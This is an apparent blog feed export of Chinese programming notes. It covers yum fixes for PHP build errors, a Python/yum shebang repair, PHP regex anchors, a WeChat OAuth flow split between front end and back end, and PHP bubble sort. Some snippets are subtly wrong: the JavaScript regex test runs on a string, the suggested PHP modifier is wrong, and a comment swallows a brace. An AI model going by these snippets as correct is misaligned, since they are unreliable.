<h4 id="configure-error-Please-reinstall-the-BZip2-distribution"><a href="#configure-error-Please-reinstall-the-BZip2-distribution" class="headerlink" title="configure: error: Please reinstall the BZip2 distribution"></a>configure: error: Please reinstall the BZip2 distribution</h4><p>Fix: <code>yum -y install bzip2-devel</code></p>
<h4 id="configure-error-Please-reinstall-the-libcurl-distribution-–-easy-h-should-be-in-include-curl"><a href="#configure-error-Please-reinstall-the-libcurl-distribution-–-easy-h-should-be-in-include-curl" class="headerlink" title="configure: error: Please reinstall the libcurl distribution – easy.h should be in/include/curl/"></a>configure: error: Please reinstall the libcurl distribution – easy.h should be in/include/curl/</h4><p>Fix: <code>yum -y install curl-devel</code></p>
<h4 id="configure-error-DBA-Could-not-find-necessary-header-file-s"><a href="#configure-error-DBA-Could-not-find-necessary-header-file-s" class="headerlink" title="configure: error: DBA: Could not find necessary header file(s)"></a>configure: error: DBA: Could not find necessary header file(s)</h4><p>Fix: <code>yum -y install db4-devel</code></p>
<h4 id="configure-error-jpeglib-h-not-found"><a href="#configure-error-jpeglib-h-not-found" class="headerlink" title="configure: error: jpeglib.h not found"></a>configure: error: jpeglib.h not found</h4><p>Fix: <code>yum -y install libjpeg-devel</code></p>
<h4 id="configure-error-png-h-not-found-1"><a href="#configure-error-png-h-not-found-1" class="headerlink" title="configure: error: png.h not found"></a>configure: error: png.h not found</h4><p>Fix: <code>yum -y install libpng-devel</code></p>
<h4 id="configure-error-freetype-h-not-found-1"><a href="#configure-error-freetype-h-not-found-1" class="headerlink" title="configure: error: freetype.h not found"></a>configure: error: freetype.h not found</h4><p>Fix: <code>Reconfigure your PHP with the following option. --with-xpm-dir=/usr</code></p>
<h4 id="configure-error-libXpm-a-so-not-found"><a href="#configure-error-libXpm-a-so-not-found" class="headerlink" title="configure: error: libXpm.(a|so) not found"></a>configure: error: libXpm.(a|so) not found</h4><p>Fix: <code>yum -y install libXpm-devel</code></p>
<h4 id="configure-error-Unable-to-locate-gmp-h"><a href="#configure-error-Unable-to-locate-gmp-h" class="headerlink" title="configure: error: Unable to locate gmp.h"></a>configure: error: Unable to locate gmp.h</h4><p>Fix: <code>yum -y install gmp-devel</code></p>
<h4 id="configure-error-utf8-mime2text-has-new-signature-but-U8T-CANONICAL-is-missing-This-should-not-happen-Check-config-log-for-additional-information"><a href="#configure-error-utf8-mime2text-has-new-signature-but-U8T-CANONICAL-is-missing-This-should-not-happen-Check-config-log-for-additional-information" class="headerlink" title="configure: error: utf8_mime2text() has new signature, but U8T_CANONICAL is missing. This should not happen. Check config.log for additional information"></a>configure: error: utf8_mime2text() has new signature, but U8T_CANONICAL is missing. This should not happen. Check config.log for additional information</h4><p>Fix: <code>yum -y install libc-client-devel</code></p>
<h4 id="configure-error-Cannot-find-ldap-h"><a href="#configure-error-Cannot-find-ldap-h" class="headerlink" title="configure: error: Cannot find ldap.h"></a>configure: error: Cannot find ldap.h</h4><p>Fix: <code>yum -y install openldap-devel</code></p>
<h4 id="configure-error-ODBC-header-file-‘-usr-include-sqlext-h’-not-found-1"><a href="#configure-error-ODBC-header-file-‘-usr-include-sqlext-h’-not-found-1" class="headerlink" title="configure: error: ODBC header file ‘/usr/include/sqlext.h’ not found"></a>configure: error: ODBC header file ‘/usr/include/sqlext.h’ not found</h4><p>Fix: <code>yum -y install unixODBC-devel</code></p>
<h4 id="configure-error-Cannot-find-libpq-fe-h-Please-specify-correct-PostgreSQL-installation-path-1"><a href="#configure-error-Cannot-find-libpq-fe-h-Please-specify-correct-PostgreSQL-installation-path-1" class="headerlink" title="configure: error: Cannot find libpq-fe.h. Please specify correct PostgreSQL installation path"></a>configure: error: Cannot find libpq-fe.h. Please specify correct PostgreSQL installation path</h4><p>Fix: <code>yum -y install postgresql-devel</code></p>
<h4 id="configure-error-Please-reinstall-the-sqlite3-distribution"><a href="#configure-error-Please-reinstall-the-sqlite3-distribution" class="headerlink" title="configure: error: Please reinstall the sqlite3 distribution"></a>configure: error: Please reinstall the sqlite3 distribution</h4><p>Fix: <code>yum -y install sqlite-devel</code></p>
<h4 id="configure-error-Cannot-find-pspell-1"><a href="#configure-error-Cannot-find-pspell-1" class="headerlink" title="configure: error: Cannot find pspell"></a>configure: error: Cannot find pspell</h4><p>Fix: <code>yum -y install aspell-devel</code></p>
<h4 id="configure-error-SNMP-sanity-check-failed-Please-check-config-log-for-more-information"><a href="#configure-error-SNMP-sanity-check-failed-Please-check-config-log-for-more-information" class="headerlink" title="configure: error: SNMP sanity check failed. Please check config.log for more information"></a>configure: error: SNMP sanity check failed. Please check config.log for more information</h4><p>Fix: <code>yum -y install net-snmp-devel</code></p>
<h4 id="configure-error-xslt-config-not-found-Please-reinstall-the-libxslt-gt-1-1-0-distribution-2"><a href="#configure-error-xslt-config-not-found-Please-reinstall-the-libxslt-gt-1-1-0-distribution-2" class="headerlink" title="configure: error: xslt-config not found. Please reinstall the libxslt &gt;= 1.1.0 distribution"></a>configure: error: xslt-config not found. Please reinstall the libxslt &gt;= 1.1.0 distribution</h4><p>Fix: <code>yum -y install libxslt-devel</code></p>
<h4 id="configure-error-xml2-config-not-found-Please-check-your-libxml2-installation"><a href="#configure-error-xml2-config-not-found-Please-check-your-libxml2-installation" class="headerlink" title="configure: error: xml2-config not found. Please check your libxml2 installation"></a>configure: error: xml2-config not found. Please check your libxml2 installation</h4><p>Fix: <code>yum -y install libxml2-devel</code></p>
<h4 id="checking-for-PCRE-headers-location…-configure-error-Could-not-find-pcre-h-in-usr"><a href="#checking-for-PCRE-headers-location…-configure-error-Could-not-find-pcre-h-in-usr" class="headerlink" title="checking for PCRE headers location… configure: error: Could not find pcre.h in /usr"></a>checking for PCRE headers location… configure: error: Could not find pcre.h in /usr</h4><p>Fix: <code>yum -y install pcre-devel</code></p>
<h4 id="configure-error-Cannot-find-MySQL-header-files-under-yes-Note-that-the-MySQL-client-library-is-not-bundled-anymore"><a href="#configure-error-Cannot-find-MySQL-header-files-under-yes-Note-that-the-MySQL-client-library-is-not-bundled-anymore" class="headerlink" title="configure: error: Cannot find MySQL header files under yes. Note that the MySQL client library is not bundled anymore"></a>configure: error: Cannot find MySQL header files under yes. Note that the MySQL client library is not bundled anymore</h4><p>Fix: <code>yum -y install mysql-devel</code></p>
<h4 id="checking-for-unixODBC-support…-configure-error-ODBC-header-file-‘-usr-include-sqlext-h’-not-found"><a href="#checking-for-unixODBC-support…-configure-error-ODBC-header-file-‘-usr-include-sqlext-h’-not-found" class="headerlink" title="checking for unixODBC support… configure: error: ODBC header file ‘/usr/include/sqlext.h’ not found"></a>checking for unixODBC support… configure: error: ODBC header file ‘/usr/include/sqlext.h’ not found</h4><p>Fix: <code>yum -y install unixODBC-devel</code></p>
<h4 id="checking-for-pg-config…-not-found-configure-error-Cannot-find-libpq-fe-h-Please-specify-correct-PostgreSQL-installation-path"><a href="#checking-for-pg-config…-not-found-configure-error-Cannot-find-libpq-fe-h-Please-specify-correct-PostgreSQL-installation-path" class="headerlink" title="checking for pg_config… not found configure: error: Cannot find libpq-fe.h. Please specify correct PostgreSQL installation path"></a>checking for pg_config… not found configure: error: Cannot find libpq-fe.h. Please specify correct PostgreSQL installation path</h4><p>Fix: <code>yum -y install postgresql-devel</code></p>
<h4 id="configure-error-Cannot-find-pspell-2"><a href="#configure-error-Cannot-find-pspell-2" class="headerlink" title="configure: error: Cannot find pspell"></a>configure: error: Cannot find pspell</h4><p>Fix: <code>yum -y install pspell-devel</code></p>
<h4 id="configure-error-Could-not-find-net-snmp-config-binary-Please-check-your-net-snmp-installation-2"><a href="#configure-error-Could-not-find-net-snmp-config-binary-Please-check-your-net-snmp-installation-2" class="headerlink" title="configure: error: Could not find net-snmp-config binary. Please check your net-snmp installation"></a>configure: error: Could not find net-snmp-config binary. Please check your net-snmp installation</h4><p>Fix: <code>yum -y install net-snmp-devel</code></p>
<h4 id="configure-error-xslt-config-not-found-Please-reinstall-the-libxslt-gt-1-1-0-distribution-3"><a href="#configure-error-xslt-config-not-found-Please-reinstall-the-libxslt-gt-1-1-0-distribution-3" class="headerlink" title="configure: error: xslt-config not found. Please reinstall the libxslt &gt;= 1.1.0 distribution"></a>configure: error: xslt-config not found. Please reinstall the libxslt &gt;= 1.1.0 distribution</h4><p>Fix: <code>yum -y install libxslt-devel</code></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>No module named yum</title>
    <url>/articles/No%20module%20named%20yum/</url>
    <content><![CDATA[<p>安装如下方法安装python2.7：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install –y python27 python27-devel python-docutils</span><br><span class="line"></span><br><span class="line">cd /usr/bin/</span><br><span class="line"></span><br><span class="line">rm -rf python</span><br><span class="line"></span><br><span class="line">cp python2.7 python</span><br></pre></td></tr></table></figure>

<p>出现yum错误：No module named yum</p>
<p>解决方法，查看 /usr/bin下python有哪几个版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ll /usr/bin</span><br></pre></td></tr></table></figure>

<p>我这里是：2.6  和  2.7 （刚安装的）</p>
<p>由于yum命令不兼容python2.7，需修改/usr/bin/yum文件，将第一行由“#!/usr/bin/python”改为“#!/usr/bin/python2.6”</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>PHP独特的正则表达式</title>
    <url>/articles/PHP%E7%8B%AC%E7%89%B9%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<p>code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// php 7.2.16</span></span><br><span class="line">var_dump(preg_match(<span class="string">"/^[a-z]+$/"</span>, <span class="string">"abc\n"</span>)); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"/^[a-z]+$/"</span>.test(<span class="string">"abc\n"</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// java(jdk11)</span></span><br><span class="line">System.out.println(Pattern.matches(<span class="string">"^[a-z]+$"</span>, <span class="string">"abc\n"</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>Php使用的是 Perl特性的<a href="https://www.regular-expressions.info/anchors.html" target="_blank" rel="noopener">匹配规则</a>，所以要想达到下面的效果需要在使用</p>
<p><code>/^[a-z]+$/n</code>  或   <code>/(*CRLF)^[a-z]+$/</code></p>
<p>php文档中关于此段的解释 <a href="https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php</a></p>
<p>“Because Perl returns a string with a newline at the end when reading a line from a file, Perl’s regex engine matches $ at the position before the line break at the end of the string even when multi-line mode is turned off. Perl also matches $ at the very end of the string, regardless of whether that character is a line break. So ^\d+$ matches 123 whether the subject string is 123 or 123\n.”</p>
<p>“D (PCRE_DOLLAR_ENDONLY)</p>
<p>If this modifier is set, a dollar metacharacter in the pattern matches only at the end of the subject string. Without this modifier, a dollar also matches immediately before the final character if it is a newline (but not before any other newlines). This modifier is ignored if m modifier is set. There is no equivalent to this modifier in Perl.”</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>RESTful标准下的微信网页授权</title>
    <url>/articles/RESTful%E6%A0%87%E5%87%86%E4%B8%8B%E7%9A%84%E5%BE%AE%E4%BF%A1%E7%BD%91%E9%A1%B5%E6%8E%88%E6%9D%83/</url>
    <content><![CDATA[<h2 id="微信网页授权流程"><a href="#微信网页授权流程" class="headerlink" title="微信网页授权流程"></a>微信网页授权流程</h2><p><img src="/articles/RESTful标准下的微信网页授权/1.png" alt="微信网页授权流程"></p>
<p>具体而言，可分为两步：</p>
<p>1、引导用户进入授权页面同意授权，获取code 【拉起授权页】 </p>
<blockquote>
<p>引导用户点击授权链接<br><a href="https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&amp;redirect_uri=REDIRECT_URI&amp;response_type=CODE&amp;scope=SCOPE&amp;state=STATE#wechat_redirect" target="_blank" rel="noopener">https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&amp;redirect_uri=REDIRECT_URI&amp;response_type=CODE&amp;scope=SCOPE&amp;state=STATE#wechat_redirect</a></p>
</blockquote>
<p>这里有两个参数比较注意的是：redirect_uri 授权成功后的跳转地址，授权作用域scope参数有两个值：snsapi_base和snsapi_userinfo。如果只需要获取openid则前者就够了，后者还可获取微信用户信息，前者的静默授权（不显示授权页面）功能也挺棒的。</p>
<p>若提示该链接无法访问，请检查参数是否填写错误，是否拥有scope参数对应的授权作用域权限。微信返回参数错误的原因一般有两种：一是在微信公众平台没有配置相应的参数；二是前端配置的接口参数与公众平台不一致。</p>
<p>具体参数说明</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">是否必须</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">appid</td>
<td align="left">是</td>
<td align="left">公众号的唯一标识</td>
</tr>
<tr>
<td align="left">redirect_uri</td>
<td align="left">是</td>
<td align="left">授权后重定向的回调链接地址， 需要使用 urlencode 对链接进行处理,<code>注意这个地址必须在公众号后台网页授权域名下</code></td>
</tr>
<tr>
<td align="left">response_type</td>
<td align="left">是</td>
<td align="left">返回类型，填写code</td>
</tr>
<tr>
<td align="left">scope</td>
<td align="left">是</td>
<td align="left">应用授权作用域，snsapi_base （不弹出授权页面，直接跳转，只能获取用户openid），snsapi_userinfo （弹出授权页面，可通过openid拿到昵称、性别、所在地。并且， 即使在未关注的情况下，只要用户授权，也能获取其信息 ）</td>
</tr>
<tr>
<td align="left">state</td>
<td align="left">否</td>
<td align="left">重定向后会带上state参数，传递什么返回什么, 可以作为参数传递</td>
</tr>
<tr>
<td align="left">wechat_redirect</td>
<td align="left">是</td>
<td align="left">无论直接打开还是做页面302重定向时候，必须带此参数</td>
</tr>
</tbody></table>
<p>2、通过code换取网页授权access_token进而获取用户openid和其他用户信息【获取用户信息】</p>
<blockquote>
<p>获取code后，请求以下链接获取access_token<br><a href="https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;secret=SECRET&amp;code=CODE&amp;grant_type=authorization_code" target="_blank" rel="noopener">https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;secret=SECRET&amp;code=CODE&amp;grant_type=authorization_code</a></p>
</blockquote>
<p>参数说明</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">是否必须</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">appid</td>
<td align="left">是</td>
<td align="left">公众号的唯一标识</td>
</tr>
<tr>
<td align="left">secret</td>
<td align="left">是</td>
<td align="left">公众号的appsecret</td>
</tr>
<tr>
<td align="left">code</td>
<td align="left">是</td>
<td align="left">填写第一步获取的code参数</td>
</tr>
<tr>
<td align="left">grant_type</td>
<td align="left">是</td>
<td align="left">填写为authorization_code</td>
</tr>
</tbody></table>
<p>正确时返回的JSON数据包如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"access_token"</span>:<span class="string">"ACCESS_TOKEN"</span>,</span><br><span class="line">  <span class="attr">"expires_in"</span>:<span class="number">7200</span>,</span><br><span class="line">  <span class="attr">"refresh_token"</span>:<span class="string">"REFRESH_TOKEN"</span>,</span><br><span class="line">  <span class="attr">"openid"</span>:<span class="string">"OPENID"</span>,</span><br><span class="line">  <span class="attr">"scope"</span>:<span class="string">"SCOPE"</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拉取用户信息(需scope为 snsapi_userinfo)</p>
<p>如果网页授权作用域为snsapi_userinfo，则此时开发者可以通过access_token和openid拉取用户信息了。</p>
<blockquote>
<p>http：GET（请使用https协议）<br><a href="https://api.weixin.qq.com/sns/userinfo?access_token=ACCESS_TOKEN&amp;openid=OPENID&amp;lang=zh_CN" target="_blank" rel="noopener">https://api.weixin.qq.com/sns/userinfo?access_token=ACCESS_TOKEN&amp;openid=OPENID&amp;lang=zh_CN</a></p>
</blockquote>
<p>参数说明</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">是否必须</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">access_token</td>
<td align="left">是</td>
<td align="left">网页授权接口调用凭证,注意：此access_token与基础支持的access_token不同</td>
</tr>
<tr>
<td align="left">openid</td>
<td align="left">是</td>
<td align="left">用户的唯一标识</td>
</tr>
<tr>
<td align="left">lang</td>
<td align="left">是</td>
<td align="left">返回国家地区语言版本，zh_CN 简体，zh_TW 繁体，en 英语</td>
</tr>
</tbody></table>
<p>正确时返回的JSON数据包如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;   </span><br><span class="line">  <span class="attr">"openid"</span>:<span class="string">" OPENID"</span>,</span><br><span class="line">  <span class="attr">"nickname"</span>: NICKNAME,</span><br><span class="line">  <span class="attr">"sex"</span>:<span class="string">"1"</span>,</span><br><span class="line">  <span class="attr">"province"</span>:<span class="string">"PROVINCE"</span>,</span><br><span class="line">  <span class="attr">"city"</span>:<span class="string">"CITY"</span>,</span><br><span class="line">  <span class="attr">"country"</span>:<span class="string">"COUNTRY"</span>,</span><br><span class="line">  <span class="attr">"headimgurl"</span>: <span class="string">"http://thirdwx.qlogo.cn/mmopen/g3MonUZtNHkdmzicIlibx6iaFqAc56vxLSUfpb6n5WKSYVY0ChQKkiaJSgQ1dZuTOgvLLrhJbERQQ4eMsv84eavHiaiceqxibJxCfHe/46"</span>,</span><br><span class="line">  <span class="attr">"privilege"</span>:[ <span class="string">"PRIVILEGE1"</span> <span class="string">"PRIVILEGE2"</span>     ],</span><br><span class="line">  <span class="attr">"unionid"</span>: <span class="string">"o6_bmasdasdsad6_2sgVt7hMZOPfL"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：unionid 只有在开发者将公众号绑定到<a href="https://open.weixin.qq.com/" target="_blank" rel="noopener">微信开放平台帐号</a>后，才会出现该字段。</p>
</blockquote>
<p>到此，微信网页授权也就结束了，更多请查看<a href="https://developers.weixin.qq.com/doc/offiaccount/OA_Web_Apps/Wechat_webpage_authorization.html" target="_blank" rel="noopener">微信网页授权文档</a></p>
<h2 id="针对RESTful规范修改"><a href="#针对RESTful规范修改" class="headerlink" title="针对RESTful规范修改"></a>针对RESTful规范修改</h2><p>现代项目开发基本上都是采用完全的前后端分离开发模式，后端采用统一规范返回json或者jsonp等给前端，而前端不再是伪静态页面，而是存粹的静态HTML,用户请求基本上都是通过ajax此类异步请求完成后端数据接收的。而在官方推荐的流程中，redirect_url被定向到后端处理接口，处理完成后使用header等强制跳转处理后的页面的方式在此处就行不通了，因为它打破了前期统一制定好的代码规范。那么 redirect_url 定向到前端页面，让前端来接收Code是否可行呢？ 答案是：可行。</p>
<blockquote>
<p>超文本标记语言（HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。HTML是一种基础技术，常与CSS、JavaScript一起被众多网站用于设计网页、网页应用程序以及移动应用程序的用户界面[3]。网页浏览器可以读取HTML文件，并将其渲染成可视化网页。HTML描述了一个网站的结构语义随着线索的呈现，使之成为一种标记语言而非编程语言。       —–<a href="https://en.wikipedia.org/wiki/HTML" target="_blank" rel="noopener">wiki</a></p>
</blockquote>
<p>我们知道html不是编程语言，是不能如php、java等编程语言那样获取用户请求参数的，但是GET请求例外,因为<code>GET参数通过URL传递</code>, 使用<code>location.href</code>或<code>location.search</code>是可以从URL中提取到GET参数的，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> getQueryVariable = <span class="function">(<span class="params">variable</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> query = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">var</span> vars = query.split(<span class="string">"&amp;"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; vars.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> pair = vars[i].split(<span class="string">"="</span>);</span><br><span class="line">        <span class="keyword">if</span> (pair[<span class="number">0</span>] === variable) &#123;</span><br><span class="line">            <span class="keyword">return</span> pair[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回到正题，我们知道用户同意授权后，微信重定向时将code和state作为参数加到redirect_url链接上，也就是如下形式：</p>
<blockquote>
<p>redirect_url?code=001EX7O42pPubS00IvO42KtjO42EX7O8&amp;state</p>
</blockquote>
<p>处理过程如下：</p>
<p>1、我们将redirect_url定向到前端静态处理的页面A</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">A.html</span><br><span class="line"><span class="comment">// 获取授权url</span></span><br><span class="line"><span class="built_in">window</span>.auth = <span class="function">(<span class="params">type</span>) =&gt;</span> &#123;</span><br><span class="line">    http(<span class="string">'wxAuthUrl'</span>, &#123;<span class="attr">type</span>: type, <span class="attr">callback</span>: location.href <span class="comment">//A.html&#125;, (response) =&gt; &#123;</span></span><br><span class="line">        location.href = response.data;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应的后端接口:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 获取授权地址</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@request</span>('/wxAuthUrl')</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> array $request</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">wxAuthUrl</span><span class="params">(array $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $callback = urlencode($request[<span class="string">'callback'</span>]);<span class="comment">// redirect_url</span></span><br><span class="line">    $state = @$request[<span class="string">'type'</span>]; <span class="comment">// 根据这个值判断授权范围scope</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> == $state) &#123;</span><br><span class="line">        $scope = <span class="string">"snsapi_userinfo"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $scope = <span class="string">"snsapi_base"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $url = <span class="string">"https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx552593a8e7c4b0de&amp;redirect_uri=&#123;$callback&#125;&amp;response_type=code&amp;scope=&#123;$scope&#125;&amp;state=&#123;$state&#125;#wechat_redirect"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response(<span class="number">0</span>, <span class="string">'success'</span>, $url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、页面A接收到code值以后，传递给后台</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">A.html</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> code = getQueryVariable(<span class="string">'code'</span>), state = getQueryVariable(<span class="string">'state'</span>); <span class="comment">// 获取到微信传递的code和state</span></span><br><span class="line">  <span class="keyword">if</span> (code) &#123;</span><br><span class="line">      http(<span class="string">'wxCall'</span>, &#123;<span class="attr">code</span>: code, <span class="attr">state</span>: state&#125;, (response) =&gt; &#123;<span class="comment">// 返回给后端处理</span></span><br><span class="line">          <span class="built_in">document</span>.getElementById(<span class="string">'content'</span>).innerHTML = <span class="built_in">JSON</span>.stringify(response.data);</span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>3、后台通过code执行授权<a href="#微信网页授权流程">步骤2</a>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 微信授权回调，原来是作为redirect_url使用的，现在修改下返回值即可满足新需求</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@request</span>('/wxCall')</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> array $request</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">wxCall</span><span class="params">(array $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// code-&gt;access_token</span></span><br><span class="line">        $ret = json_decode(file_get_contents(<span class="string">"https://api.weixin.qq.com/sns/oauth2/access_token?appid="</span> . <span class="keyword">self</span>::APPID . <span class="string">"&amp;secret="</span> . <span class="keyword">self</span>::SECRET . <span class="string">"&amp;code=&#123;$request['code']&#125;&amp;grant_type=authorization_code"</span>), <span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// access_token-&gt;profile</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1</span> == $request[<span class="string">'state'</span>]) &#123;</span><br><span class="line">            $ret = json_decode(file_get_contents(<span class="string">"https://api.weixin.qq.com/sns/userinfo?access_token=&#123;$ret['access_token']&#125;&amp;openid=&#123;$ret['openid']&#125;&amp;lang=zh_CN"</span>), <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// header("location: success.html");</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response(<span class="number">0</span>, <span class="string">'success'</span>, $ret);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        <span class="comment">// header("location: fail.html");</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response(<span class="number">4000</span>, $e-&gt;getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样一来，整个交互过程便统一了, 效果如下：</p>
<p><img src="/articles/RESTful标准下的微信网页授权/3.png" alt></p>
<p>演示地址：<a href="https://app.ya2.top/wxauth/" target="_blank" rel="noopener">https://app.ya2.top/wxauth/</a> (建议在微信环境打开)<br>源码地址：<a href="https://github.com/gouyuwang/wxauth/" target="_blank" rel="noopener">https://github.com/gouyuwang/wxauth/</a></p>
]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
      <tags>
        <tag>微信登录</tag>
        <tag>网页授权</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP实现四种基本排序算法</title>
    <url>/articles/PHP%E5%AE%9E%E7%8E%B0%E5%9B%9B%E7%A7%8D%E5%9F%BA%E6%9C%AC%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h4 id="Q：分别用冒泡排序法，快速排序法，选择排序法，插入排序法将下面数组中的值按照从小到大的顺序进行排序。"><a href="#Q：分别用冒泡排序法，快速排序法，选择排序法，插入排序法将下面数组中的值按照从小到大的顺序进行排序。" class="headerlink" title="Q：分别用冒泡排序法，快速排序法，选择排序法，插入排序法将下面数组中的值按照从小到大的顺序进行排序。"></a>Q：分别用冒泡排序法，快速排序法，选择排序法，插入排序法将下面数组中的值按照从小到大的顺序进行排序。</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">43</span>,<span class="number">54</span>,<span class="number">62</span>,<span class="number">21</span>,<span class="number">66</span>,<span class="number">32</span>,<span class="number">78</span>,<span class="number">36</span>,<span class="number">76</span>,<span class="number">39</span>);</span><br></pre></td></tr></table></figure>

<h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><p>思路分析：在要排序的一组数中，对当前还未排好的序列，从前往后对相邻的两个数依次进行比较和调整，让较大的数往下沉，较小的往上冒。即，每当两相邻的数比较后发现它们的排序与排序要求相反时，就将它们互换。</p>
<p>代码实现：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bubbleSort</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $len = count($arr);</span><br><span class="line">    <span class="comment">// 该层循环控制 需要冒泡的轮数</span></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        <span class="comment">// 该层循环用来控制每轮 冒出一个数 需要比较的次数</span></span><br><span class="line">        <span class="keyword">for</span> ($k = <span class="number">0</span>; $k &lt; $len - $i; $k++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($arr[$k] &gt; $arr[$k + <span class="number">1</span>]) &#123;</span><br><span class="line">                $tmp = $arr[$k + <span class="number">1</span>];</span><br><span class="line">                $arr[$k + <span class="number">1</span>] = $arr[$k];</span><br><span class="line">                $arr[$k] = $tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

